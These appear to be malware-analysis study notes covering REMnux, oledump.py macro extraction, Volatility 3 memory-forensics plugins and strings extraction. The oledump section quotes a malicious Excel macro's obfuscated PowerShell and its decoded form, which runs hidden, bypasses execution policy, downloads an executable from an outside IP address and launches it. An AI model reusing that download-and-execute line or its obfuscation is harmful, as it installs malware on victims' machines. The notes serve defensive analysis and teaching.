# Malware Analysis Tools

## REMnux VM

**REMnux** is a specialized Linux distribution designed for malware analysis.

**Pre-installed Tools:**
- Volatility (memory forensics)
- YARA (pattern matching)
- Wireshark (network analysis)
- oledump (OLE file analysis)
- INetSim (network simulation)

**Purpose**: Sandbox environment for safe malware analysis without risking host system.

---

## Oledump.py - OLE File Analysis

**Purpose**: Analyze OLE2 files (Office documents, Excel, Word) for embedded macros.

### Basic Usage

**List streams:**
```bash
oledump.py agenttesla.xlsm
```

**Output:**
```
A: xl/vbaProject.bin
 A1: 468 'PROJECT'
 A2: 62 'PROJECTwm'
 A3: m 169 'VBA/Sheet1'
 A4: M 688 'VBA/ThisWorkbook'  # Capital M = Macro present
```

### Analyzing Macros

**View specific stream (hex):**
```bash
oledump.py agenttesla.xlsm -s 4
```

**Decompress VBA macro:**
```bash
oledump.py agenttesla.xlsm -s 4 --vbadecompress
```

**Result**: Readable VBA code

### Example Malicious Macro

**Obfuscated PowerShell command:**
```vba
Sqtnew = "^p*o^*w*e*r*s^^*h*e*l^*l* -W*i*n*^d*o*w^*S*t*y*^l*e hidden..."
```

**De-obfuscation**: Replace `*` and `^` with empty strings (use CyberChef)

**Decoded PowerShell:**
```powershell
powershell -WindowStyle hidden -executionpolicy bypass;
Invoke-WebRequest -Uri "http://193.203.203.67/rt/Doc-3737122pdf.exe" -OutFile $TempFile;
Start-Process $TempFile;
```

**Attack Flow:**
1. User opens Excel file
2. Macro executes hidden PowerShell
3. Downloads malicious .exe
4. Executes downloaded file

---

## Volatility 3 - Memory Forensics

**Purpose**: Analyze memory dumps to extract artifacts (processes, DLLs, injected code).

### Basic Syntax
```bash
vol3 -f memory.mem <plugin>
```

### Common Windows Plugins

| Plugin | Purpose |
|--------|---------|
| `windows.pstree.PsTree` | Process tree (parent-child relationships) |
| `windows.pslist.PsList` | Active processes list |
| `windows.cmdline.CmdLine` | Process command-line arguments |
| `windows.filescan.FileScan` | Scan for file objects |
| `windows.dlllist.DllList` | Loaded modules/DLLs |
| `windows.psscan.PsScan` | Scan for processes (including hidden) |
| `windows.malfind.Malfind` | Detect injected code |

### Bulk Preprocessing (Loop)

**Save all plugin outputs to text files:**
```bash
for plugin in windows.malfind.Malfind windows.psscan.PsScan windows.pstree.PsTree windows.pslist.PsList windows.cmdline.CmdLine windows.filescan.FileScan windows.dlllist.DllList; do vol3 -q -f wcry.mem $plugin > wcry.$plugin.txt; done
```

**Flags:**
- `-q` - Quiet mode (no progress output)
- `-f` - Input memory file

**Result**: 7 text files with analysis results

---

## Strings Extraction

**Purpose**: Extract readable text from binary/memory files.

### Extract Different Encodings

**ASCII strings:**
```bash
strings wcry.mem > wcry.strings.ascii.txt
```

**16-bit little-endian (Unicode):**
```bash
strings -e l wcry.mem > wcry.strings.unicode_little_endian.txt
```

**16-bit big-endian:**
```bash
strings -e b wcry.mem > wcry.strings.unicode_big_endian.txt
```

**Use Case**: Find URLs, IPs, commands, usernames embedded in memory

---

## Preprocessing Best Practices

**Why Preprocess?**
- Save time in investigations
- Enable quick searches across artifacts
- Standardize analysis workflow
- Archive evidence outputs

**Workflow:**
1. **Memory Analysis**: Run Volatility plugins → Save to text files
2. **String Extraction**: Extract ASCII/Unicode strings → Save to text files
3. **Document Analysis**: Use oledump for Office files → Extract macros
4. **De-obfuscation**: Use CyberChef to decode obfuscated content

---

## Key Takeaways

- **REMnux** = ready-to-use malware analysis environment
- **Oledump** extracts/analyzes macros from Office documents
- **Capital M** in oledump indicates macro presence
- **Volatility** analyzes memory dumps for forensic artifacts
- **Bulk processing** with loops saves time
- **Strings extraction** reveals hidden text in binaries
- **Preprocessing** enables efficient investigation